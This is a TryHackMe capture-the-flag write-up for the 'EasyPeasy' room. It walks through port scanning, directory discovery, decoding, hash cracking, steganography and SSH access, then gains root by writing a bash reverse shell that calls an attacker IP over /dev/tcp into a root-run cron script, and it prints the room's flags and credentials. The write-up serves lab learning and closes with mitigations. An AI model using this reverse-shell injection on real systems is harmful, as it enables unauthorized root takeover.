---

title: EasyPeasy CTF
category: Privilege Escalation
difficulty: Easy
tags: [nmap, gobuster, base64, base62, md5, hashcat, steghide, ssh, cron, reverse shell, privilege escalation]
platform: TryHackMe
year: 2025
date: 2025-10-26
---

# 🧩 EasyPeasy CTF (TryHackMe)

## 📝 Description

A multi-stage machine that practices service enumeration, web discovery, hash cracking, steganography, and privilege escalation via a writable executable script. The path includes web directory discovery, multiple encodings (Base64, Base62, binary), hash cracking (MD5 + GOST), extracting hidden data from an image (steg), obtaining SSH credentials, and finally achieving root by injecting a reverse shell into a misconfigured script that runs as root.

---

## 🔍 Initial Recon

### 🔎 Nmap Scan

```bash
┌──(kali㉿kali)-[~/thm/ctf]
└─$ nmap 10.201.115.208 -sS -sV -p- --reason
```

**Result (abbreviated):**

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
```

**Notes:**

* Two HTTP services (port 80 and 65524) and an SSH service on a non-standard port (6498) were discovered.
* Robots disallowed entries were present on both HTTP servers.

---

## 🌐 Step 1: Web Discovery — Port 80

Ran `gobuster` against the webroot:

```bash
gobuster dir -u http://10.201.44.194/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Findings:

```
/hidden (301) -> /hidden/
```

Enumerating `/hidden`:

```
/hidden/whatever (301) -> /hidden/whatever/
```

Inspecting discovered pages revealed a Base64 string:

```
ZmxhZ3tmMXJzN19mbDRnfQ==
```

Decode:

```text
base64 -> flag{f1rs7_fl4g}
```

**Flag 1:** `flag{f1rs7_fl4g}`

---

## 🔎 Step 2: Web Discovery — Port 65524

Visited `http://10.201.44.194:65524` and inspected source / robots and found multiple artefacts:

* In page source: `ObsJmP173N2X6dOrAgEAL0Vu` — decoded as **Base62** to:

  ```
  /n0th1ng3ls3m4tt3r
  ```

* `robots.txt` contained an MD5 hash:

  ```
  a18672860d0510e5ab6699730763b250
  ```

  This MD5 was cracked (using an online MD5 cracker noted as `md5hashing.net`) and revealed:

  ```
  flag{1m_s3c0nd_fl4g}
  ```

**Flag 2:** `flag{1m_s3c0nd_fl4g}`

* Visiting `/n0th1ng3ls3m4tt3r` revealed a long SHA-like hash in source:

  ```
  940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
  ```

### 🔐 Cracking the long hash

Used `hashcat` against that hash with a custom wordlist (`easypeasy_1596838725703.txt`). The successful mode was GOST R 34.11-94 (`-m 6900`).

Result:

```
940d71...:mypasswordforthatjob
```

Password recovered: `mypasswordforthatjob`

---

## 🖼️ Step 3: Steganography — Hidden Image Payload

Found image reference on `/n0th1ng3ls3m4tt3r`:

```html
<img src="binarycodepixabay.jpg" width="140px" height="140px">
```

Downloaded the image and ran `steghide`:

```bash
steghide extract -sf binarycodepixabay.jpg
# passphrase used: mypasswordforthejob
wrote extracted data to "secrettext.txt".
```

`secrettext.txt` contained:

```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

Binary → ASCII:

```
iconvertedmypasswordtobinary
```

So credentials:

```
username: boring
password: iconvertedmypasswordtobinary
```

(Recall: the steghide passphrase was `mypasswordforthejob` — note the subtle difference in wording between cracked GOST output and the steghide passphrase.)

---

## 🔑 Step 4: SSH Access (User Shell)

SSH to the host using the extracted username and port from enumeration (port used in your notes was `6598`):

```bash
ssh boring@<ip> -p 6598
# Password: iconvertedmypasswordtobinary
```

On login the machine displayed a scary banner, but after login you had a user shell as `boring`.

Checked for user flag:

```bash
cat ~/user.txt
# Output (rotated): synt{a0jvgf33zfa0ez4y}
# After rot13 -> flag{n0wits33msn0rm4l}
```

**User flag:** `flag{n0wits33msn0rm4l}`

---

## 🛠️ Step 5: Privilege Escalation — Writable, Executable Script

Looked for files that are both writable and executable by the current user:

```bash
find / -type f -exec test -w {} \; -exec test -x {} \; -print 2>/dev/null
```

Found:

```
/var/www/.mysecretcronjob.sh
```

Contents initially were empty / placeholder:

```bash
cat /var/www/.mysecretcronjob.sh
# #!/bin/bash
# i will run as root
```

The script is writable by `boring` and will be run as root (cronjob). This is a classic privilege escalation vector.

---

## 🚀 Step 6: Inject Reverse Shell & Get Root

Created a reverse shell payload and wrote it into the script:

```bash
echo "sh -i >& /dev/tcp/10.17.21.245/1234 0>&1" > /var/www/.mysecretcronjob.sh
```

On the attacker machine:

```bash
nc -lvnp 1234
# then wait for the connection
```

When the cron executed, it connected back:

```
connect to [10.17.21.245] from (UNKNOWN) [10.201.90.140] 53748
# id
uid=0(root) gid=0(root) groups=0(root)
```

We obtained a root shell.

---

## 🏁 Step 7: Root Flag

Read root flag:

```bash
cat /root/.root.txt
# flag{63a9f0ea7bb98050796b649e85481845}
```

**Root flag:** `flag{63a9f0ea7bb98050796b649e85481845}`

---

## ✅ Summary of Exploitation Path

| Phase                | Technique / Tool                      | Result / Notes                                             |
| :------------------- | :------------------------------------ | :--------------------------------------------------------- |
| Recon                | nmap, service/version detection       | ports 80, 6498 (ssh), 65524 (http)                         |
| Web discovery        | gobuster, manual inspection           | `/hidden` -> base64 flag                                   |
| Encoding discovery   | Base64, Base62 decoding               | `flag{f1rs7_fl4g}`, `/n0th1ng3ls3m4tt3r`                   |
| Hash cracking        | md5hashing.net, hashcat (GOST -m6900) | `flag{1m_s3c0nd_fl4g}`, `mypasswordforthatjob`             |
| Steganography        | steghide                              | extracted credentials (binary → ASCII)                     |
| Initial access       | ssh (non-standard port)               | user `boring`                                              |
| Privilege escalation | writable & executable cron script     | injected reverse shell into `/var/www/.mysecretcronjob.sh` |
| Root access          | netcat listener -> reverse shell      | root shell; root flag read                                 |

---

## 🔒 Mitigation & Lessons Learned

* **Avoid storing sensitive tokens/passwords in public repos or source files.** Leaked hashes and artifacts were used to pivot.
* **Use strong hashing and salting** for stored passwords; MD5 and unsalted hashes are trivial to crack.
* **File/cron permissions**: never make scripts writable by unprivileged users if they run as root. Use least privilege and proper ownership.
* **Monitor abnormal cron/script edits** and use file integrity checks (AIDE, tripwire).
* **Steganography hygiene**: avoid embedding secrets in static assets served publicly.

---

## 🧾 Appendix — Useful Commands (from this writeup)

```bash
# nmap
nmap -sS -sV -p- 10.201.115.208

# gobuster
gobuster dir -u http://10.201.44.194/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# base64 decode
echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d

# hashcat (example for GOST)
hashcat -m 6900 hashfile wordlist

# steghide extract
steghide extract -sf binarycodepixabay.jpg

# find writable+executable files
find / -type f -exec test -w {} \; -exec test -x {} \; -print 2>/dev/null

# injected reverse shell (example)
echo "sh -i >& /dev/tcp/10.17.21.245/1234 0>&1" > /var/www/.mysecretcronjob.sh
nc -lvnp 1234
```

---
